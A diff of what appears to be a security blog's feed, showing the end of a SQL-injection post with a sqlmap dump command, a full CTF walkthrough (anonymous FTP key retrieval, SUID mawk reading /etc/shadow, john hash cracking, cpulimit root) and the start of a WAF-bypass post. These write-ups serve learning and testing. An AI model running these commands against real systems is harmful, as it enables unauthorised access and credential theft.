+&lt;span class=&quot;na&quot;&gt;Sec-Fetch-Site&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;same-origin&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Te&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;trailers&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;user_Id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;2abaac0a-4af8-4101-a763-9d0229cafb12&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;email&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;naveenj@thevillagehacker.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;Mobile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;9874563217&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;role&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Analyst&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;isActive&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;response-2&quot;&gt;Response&lt;/h3&gt;
+
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;OK &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Access-Control-Allow-Origin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;* &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/json; charset=utf-8 &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Set-Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;blah...blah...blah...; Path=/; HttpOnly &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Frame-Options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;SAMEORIGIN &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-Content-Type-Options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;nosniff &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-XSS-Protection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1; mode=block &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Referrer-Policy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;strict-origin-when-cross-origin &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Strict-Transport-Security&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;max-age=31536000; includeSubDomains&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;code&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;message&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos; &apos;*&apos;&apos; at line 1&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The server responds with an error message indicating a SQL syntax error. This suggests that the application is using a MySQL database. Further exploitation can be automated using SQLMAP.&lt;/p&gt;
+
+&lt;h2 id=&quot;sqlmap-automation&quot;&gt;SQLMAP Automation&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python .&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;qlmap&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;qlmap.py &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;request.txt&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--batch&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--dbs&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--risk&lt;/span&gt; 3 &lt;span class=&quot;nt&quot;&gt;--level&lt;/span&gt; 4 &lt;span class=&quot;nt&quot;&gt;--random-agent&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--tamper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;between &lt;span class=&quot;nt&quot;&gt;--proxy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http://127.0.0.1:8080
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;dumping-database&quot;&gt;Dumping Database&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/blogs/MA_SQLi/db.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;
+
+&lt;p&gt;For more insights and updates, follow me on Twitter: &lt;a href=&quot;https://twitter.com/thevillagehackr&quot;&gt;@thevillagehacker&lt;/a&gt;.&lt;/p&gt;</content><author><name>Naveen</name></author><category term="blog" /><category term="Bypasss" /><category term="Mass Assignment" /><category term="SQL Injection" /><category term="Database Dump" /><summary type="html">Blog Post</summary></entry><entry><title type="html">Proving grounds Play: OnSystemShellDredd</title><link href="http://localhost:4000/Proving_grounds_Play-OnSystemShellDredd/" rel="alternate" type="text/html" title="Proving grounds Play: OnSystemShellDredd" /><published>2023-07-07T22:10:00+05:30</published><updated>2023-07-07T22:10:00+05:30</updated><id>http://localhost:4000/Proving_grounds_Play-OnSystemShellDredd</id><content type="html" xml:base="http://localhost:4000/Proving_grounds_Play-OnSystemShellDredd/">&lt;h1 id=&quot;walkthrough-on-youtube&quot;&gt;Walkthrough on Youtube&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&quot;https://youtu.be/UPYHCc7PdGQ&quot;&gt;&lt;img src=&quot;/assets/images/CTF/Pg-Play/OnSystemShellDredd/youtube.png&quot; alt=&quot;youtube&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;nmap&quot;&gt;NMAP&lt;/h1&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;naveenj@hackerspace|01:02 AM|~/Pg-Play&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sT&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; 192.168.191.130 &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap                                                                                           
+Starting Nmap 7.93 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2023-07-08 01:02 EDT                                                
+PORT      STATE SERVICE VERSION                                                              
+21/tcp    open  ftp     vsftpd 3.0.3                                                         
+|_ftp-anon: Anonymous FTP login allowed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                       
+| ftp-syst:                                                                                  
+|   STAT:                                                                                    
+| FTP server status:                                                                         
+|      Connected to ::ffff:192.168.45.250                                                    
+|      Logged &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;as ftp                                                                      
+|      TYPE: ASCII                                                                           
+|      No session bandwidth limit                                                            
+|      Session &lt;span class=&quot;nb&quot;&gt;timeout &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;seconds is 300                                                     
+|      Control connection is plain text                                                      
+|      Data connections will be plain text                                                   
+|      At session startup, client count was 4                                                
+|      vsFTPd 3.0.3 - secure, fast, stable                                                   
+|_End of status                                                                              
+61000/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                       
+| ssh-hostkey:                                                                               
+|   2048 592d210c2faf9d5a7b3ea427aa378908 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                              
+|   256 5926da443b97d230b19b9b02748b8758 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                             
+|_  256 8ead104fe33e652840cb5bbf1d247f17 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                           
+Service Info: OSs: Unix, Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel                               
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;ftp-login&quot;&gt;FTP login&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;naveenj@hackerspace|01:07 AM|~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ftp 192.168.191.130 21                                       
+Connected to 192.168.191.130.                                                                
+220 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                           
+Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.191.130:naveenj&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous                                                    
+331 Please specify the password.                                                             
+Password:                                                                                    
+230 Login successful.                                                                        
+Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is UNIX.                                                                  
+Using binary mode to transfer files.                                                         
+ftp&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;list-directory&quot;&gt;List directory&lt;/h3&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-lsa&lt;/span&gt;                                                                                 
+229 Entering Extended Passive Mode &lt;span class=&quot;o&quot;&gt;(||&lt;/span&gt;|13654|&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                               
+150 Here comes the directory listing.                                                        
+drwxr-xr-x    3 0        115          4096 Aug 06  2020 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                    
+drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..                                   
+drwxr-xr-x    2 0        0            4096 Aug 06  2020 .hannah                              
+226 Directory send OK.                                                                       
+ftp&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;changing-directory&quot;&gt;Changing directory&lt;/h2&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; .hannah                                                                              
+250 Directory successfully changed.                                                          
+ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-lsa&lt;/span&gt;                                                                                 
+229 Entering Extended Passive Mode &lt;span class=&quot;o&quot;&gt;(||&lt;/span&gt;|8389|&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                
+150 Here comes the directory listing.                                                        
+drwxr-xr-x    2 0        0            4096 Aug 06  2020 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                    
+drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..                                   
+&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;    1 0        0            1823 Aug 06  2020 id_rsa                               
+226 Directory send OK.                                                                       
+ftp&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;get-id_rsa-key-for-user-hannah&quot;&gt;Get id_rsa key for user hannah&lt;/h2&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp&amp;gt; get id_rsa                                                                              
+&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;: id_rsa remote: id_rsa                                                                 
+229 Entering Extended Passive Mode &lt;span class=&quot;o&quot;&gt;(||&lt;/span&gt;|17682|&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                               
+150 Opening BINARY mode data connection &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;id_rsa &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1823 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                             
+100% |&lt;span class=&quot;k&quot;&gt;************************************************&lt;/span&gt;|  1823       11.66 MiB/s    00:00 ETA 
+226 Transfer complete.                                                                       
+1823 bytes received &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;00:00 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8.97 KiB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                    
+ftp&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;login-to-hannah-user-using-ssh&quot;&gt;Login to hannah user using ssh&lt;/h2&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;naveenj@hackerspace|01:12 AM|~/Pg-Play/OnSystemShellDredd&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; files/id_rsa hannah@192.168.191.130                                                                                     
+ssh: connect to host 192.168.191.130 port 22: Connection refused
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Apply required permission such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod 600&lt;/code&gt; to the id_rsa file. Still the connection will be refused. As we have one more ssh service running on PORT 61000, we can try to connect there.&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;naveenj@hackerspace|01:15 AM|~/Pg-Play/OnSystemShellDredd&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; files/id_rsa hannah@192.168.191.130 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 61000                                                                           
+                                                                 
+hannah@ShellDredd:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Whooo! we are logged in to hannah user now.&lt;/p&gt;
+
+&lt;h3 id=&quot;obtaining-flag&quot;&gt;Obtaining Flag&lt;/h3&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hannah@ShellDredd:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;local.txt  user.txt
+hannah@ShellDredd:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
+Your flag is &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;another file...
+hannah@ShellDredd:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;local.txt
+5b571██████████████████████████
+hannah@ShellDredd:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h1&gt;
+&lt;p&gt;Get SUIDs and GUIDs&lt;/p&gt;
+
+&lt;h3 id=&quot;suids&quot;&gt;SUIDs&lt;/h3&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hannah@ShellDredd:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f 2&amp;gt;/dev/null
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/umount
+/usr/bin/mawk &lt;span class=&quot;nt&quot;&gt;--strange&lt;/span&gt; binary
+/usr/bin/chfn
+/usr/bin/su
+/usr/bin/chsh
+/usr/bin/fusermount
+/usr/bin/cpulimit &lt;span class=&quot;nt&quot;&gt;--strange&lt;/span&gt; binary
+/usr/bin/mount
+/usr/bin/passwd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;guids&quot;&gt;GUIDs&lt;/h3&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hannah@ShellDredd:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f 2&amp;gt;/dev/null
+/usr/sbin/unix_chkpwd
+/usr/bin/wall
+/usr/bin/mawk
+/usr/bin/ssh-agent
+/usr/bin/crontab
+/usr/bin/chage
+/usr/bin/expiry
+/usr/bin/bsd-write
+/usr/bin/cpulimit
+/usr/bin/dotlockfile
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Search for the exploit in GFTObins for the strange binary &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mawk&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CTF/Pg-Play/OnSystemShellDredd/suid_mawk.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The exploit worked and we are able to view the shadow file which contains hash of the users passwords.&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hannah@ShellDredd:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mawk &lt;span class=&quot;s1&quot;&gt;&apos;//&apos;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/etc/shadow&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-iE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;root|hannah&apos;&lt;/span&gt;
+root:&lt;span class=&quot;nv&quot;&gt;$6$pUGgTFAG7pM5Sy5M$SXmRNf2GSZhId7mGCsFw&lt;/span&gt;█████████████████████████████████████████████████████████:18656:0:99999:7:::
+hannah:&lt;span class=&quot;nv&quot;&gt;$6$y8GL381zxgwD7gRr$AhERcqNym1qlATj9Rl6R&lt;/span&gt;██████████████████████████████████████████████████████.:18656:0:99999:7:::
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s start cracking the hashes using john or crackstation.&lt;/p&gt;
+
+&lt;p&gt;Copy both the passwd and shadow files to the local machine to unshadow.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unshadow passwd shadow &amp;gt; crackme&lt;/code&gt; run the command to unshadow the file.&lt;/p&gt;
+
+&lt;h3 id=&quot;running-john&quot;&gt;Running john&lt;/h3&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;naveenj@hackerspace|01:56 AM|~/Pg-Play/OnSystemShellDredd/files&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;john crackme &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt                                                                 
+Using default input encoding: UTF-8                                                          
+Loaded 2 password hashes with 2 different salts &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sha512crypt, crypt&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$6$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SHA512 128/128 AVX 2x]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                       
+Cost 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;iteration count&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is 5000 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;all loaded hashes                                       
+Will run 4 OpenMP threads                                                                    
+Press &lt;span class=&quot;s1&quot;&gt;&apos;q&apos;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After a while there is no progress, so lets check another way.&lt;/p&gt;
+
+&lt;p&gt;Let’s check the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/cpulimit&lt;/code&gt; binary in GTFObins for exploits.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CTF/Pg-Play/OnSystemShellDredd/suid_cpulimit.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Running the exploit command.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CTF/Pg-Play/OnSystemShellDredd/root.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Obtained root and proof flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Happy Hacking!&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;
+
+&lt;p&gt;For more insights and updates, follow me on Twitter: &lt;a href=&quot;https://twitter.com/thevillagehackr&quot;&gt;@thevillagehacker&lt;/a&gt;.&lt;/p&gt;</content><author><name>Naveen</name></author><category term="CTF" /><category term="Offsec labs" /><category term="Writeup" /><summary type="html">Walkthrough on Youtube</summary></entry><entry><title type="html">Bypassing Web Application Firewall (WAF) to Exploit SQL Injection Vulnerabilities</title><link href="http://localhost:4000/Bypassing_waf_sql_dump/" rel="alternate" type="text/html" title="Bypassing Web Application Firewall (WAF) to Exploit SQL Injection Vulnerabilities" /><published>2023-05-30T22:10:00+05:30</published><updated>2023-05-30T22:10:00+05:30</updated><id>http://localhost:4000/Bypassing_waf_sql_dump</id><content type="html" xml:base="http://localhost:4000/Bypassing_waf_sql_dump/">&lt;h1 id=&quot;target-background&quot;&gt;Target Background&lt;/h1&gt;
+
+&lt;p&gt;The target of this analysis is a web application developed for financial management purposes. It offers a range of features, including bulk payment management, invoicing, and sending promotional messages to customers regarding card offers.&lt;/p&gt;
 
 &lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
-&lt;p&gt;I have created a test account through the sign up functionality in the application and after logging in, the application have asked to create an organization so we can provide access to our team members and assign them a particular roles based on how they have to play in the application.&lt;/p&gt;
+&lt;p&gt;The application incorporates input validation for its fields and employs a web application firewall (WAF) to detect and reject requests containing malicious payloads. However, due to a rookie misconfiguration, manually checking each button in the application could potentially reveal a bypass for the firewall.&lt;/p&gt;
 
-&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;
+&lt;h2 id=&quot;reconnaissance&quot;&gt;Reconnaissance&lt;/h2&gt;
 &lt;ul&gt;
-  &lt;li&gt;reactJS&lt;/li&gt;
-  &lt;li&gt;Akami Firewall&lt;/li&gt;
-  &lt;li&gt;REST APIs&lt;/li&gt;
-  &lt;li&gt;Cookie Authentication&lt;/li&gt;
+  &lt;li&gt;The application is built using ReactJS.&lt;/li&gt;
+  &lt;li&gt;It is hosted on a non-cloud environment.&lt;/li&gt;
+  &lt;li&gt;It might be running on IIS.&lt;/li&gt;
+&lt;/ul&gt;
+
